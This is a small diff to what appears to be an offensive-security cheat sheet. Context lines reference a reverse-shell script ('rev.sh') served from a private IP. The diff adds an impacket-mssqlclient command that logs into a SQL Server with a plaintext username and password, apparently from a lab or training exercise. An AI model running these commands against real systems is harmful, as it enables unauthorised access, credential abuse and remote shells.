@@ -896,6 +896,12 @@ http://192.168.45.176/share/rev.sh
 file://192.168.45.176/share/rev.sh
 ```
 
+## impacket
+```bash
+impacket-mssqlclient sql_svc:Dolphin1@10.10.108.148 -windows-auth
+
+```
+
 
 # Active Directory Privilege
 
